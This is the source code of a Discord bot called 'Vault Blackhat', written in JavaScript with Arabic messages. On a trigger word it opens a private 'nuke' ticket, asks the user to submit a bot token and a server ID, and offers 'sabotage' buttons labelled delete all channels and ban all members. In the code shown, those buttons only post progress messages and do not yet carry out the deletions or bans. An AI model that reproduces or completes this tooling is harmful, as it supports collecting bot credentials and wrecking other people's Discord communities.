const { Client, GatewayIntentBits, PermissionFlagsBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, Events, ChannelType } = require('discord.js');
const http = require('http');

const TOKEN = process.env.TOKEN;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.once('ready', () => {
    console.log(`[+] Vault Blackhat is online: ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    // ═══════════════════════════════════════════
    // 💀 الكلمة السحرية: جحفلة
    // ═══════════════════════════════════════════
    if (message.content.toLowerCase() === 'جحفلة') {
        
        const user = message.author;
        const guild = message.guild;

        try {
            // فحص إذا عنده تكت مفتوح
            const existing = guild.channels.cache.find(c => c.name === `nuke-${user.username.toLowerCase()}`);
            if (existing) {
                return message.reply(`عندك تكت مفتوح بالفعل: ${existing}`);
            }

            // إنشاء الروم
            const ticketChannel = await guild.channels.create({
                name: `nuke-${user.username}`,
                type: ChannelType.GuildText,
                permissionOverwrites: [
                    { id: guild.id, deny: [PermissionFlagsBits.ViewChannel] },
                    { id: user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
                ],
            });

            const embed = new EmbedBuilder()
                .setAuthor({ name: `@${user.username} Welcome`, iconURL: user.displayAvatarURL() })
                .setDescription("أهلاً بك في تكت **الجحفلة**.\n\nيرجى وضع **توكن البوت** و **ايدي السيرفر** في الاسفل، وسيتم فحص البوت. بعدها اختر نوع التخريب:")
                .setColor(0xFF0000) // لون أحمر
                .setFooter({ text: 'Vault Blackhat', iconURL: 'https://cdn-icons-png.flaticon.com/512/564/564619.png' });

            const actionRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('action_delete_channels').setLabel('حذف الرومات').setStyle(ButtonStyle.Danger).setEmoji('🗑️'),
                new ButtonBuilder().setCustomId('action_ban_all').setLabel('طرد الكل').setStyle(ButtonStyle.Danger).setEmoji('🔨'),
                new ButtonBuilder().setCustomId('close_ticket').setLabel('إغلاق').setEmoji('🔒').setStyle(ButtonStyle.Secondary)
            );

            await ticketChannel.send({ content: `${user}`, embeds: [embed], components: [actionRow] });
            await message.reply(`✅ تم فتح تكت الجحفلة: ${ticketChannel}`);

        } catch (error) {
            console.error(error);
            message.reply('❌ حدث خطأ (تأكد من صلاحيات البوت).');
        }
    }
});

// التعامل مع الأزرار
client.on(Events.InteractionCreate, async (interaction) => {
    if (interaction.isButton()) {
        
        if (interaction.customId === 'close_ticket') {
            await interaction.reply({ content: '🔒 سيتم إغلاق التذكرة بعد 5 ثواني...' });
            setTimeout(() => interaction.channel.delete().catch(()=>{}), 5000);
        }

        if (interaction.customId === 'action_delete_channels') {
            await interaction.reply({ content: '🗑️ جاري حذف الرومات...', ephemeral: true });
        }

        if (interaction.customId === 'action_ban_all') {
            await interaction.reply({ content: '🔨 جاري طرد الأعضاء...', ephemeral: true });
        }
    }
});

// سطر الحماية
http.createServer((req, res) => res.end('Bot is alive!')).listen(process.env.PORT || 3000);

client.login(TOKEN);
